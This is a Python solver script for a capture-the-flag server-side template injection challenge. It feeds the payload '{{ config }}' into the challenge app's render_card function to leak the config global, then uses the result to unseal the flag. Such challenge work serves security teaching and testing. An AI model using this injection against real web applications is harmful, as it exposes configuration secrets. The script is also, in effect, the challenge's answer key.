#!/usr/bin/env python3
"""SSTI: render the intended payload against the shipped template to derive the
seal key, then unseal the flag.

Offline. We import the shipped app source and call its `render_card` with the
`{{ config }}` payload; because `name` is concatenated into the template source,
the payload is evaluated and leaks the `config` global. The rendered card is the
key material -- feeding it to `unseal` recovers the flag. Rendering a plain name
would derive the wrong key, so the SSTI is genuinely required.
"""

import importlib.util
import os
import sys

sys.dont_write_bytecode = True  # keep the challenge dir free of __pycache__

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# The malicious `name` value: the intended config-leak SSTI payload.
PAYLOAD = "{{ config }}"


def load_app():
    spec = importlib.util.spec_from_file_location(
        "card_app", os.path.join(ROOT, "app.py")
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def main() -> None:
    app = load_app()
    # Evaluate the SSTI: the rendered card IS the seal key material.
    rendered = app.render_card(PAYLOAD)
    flag = app.unseal(rendered)
    print(flag)


if __name__ == "__main__":
    main()
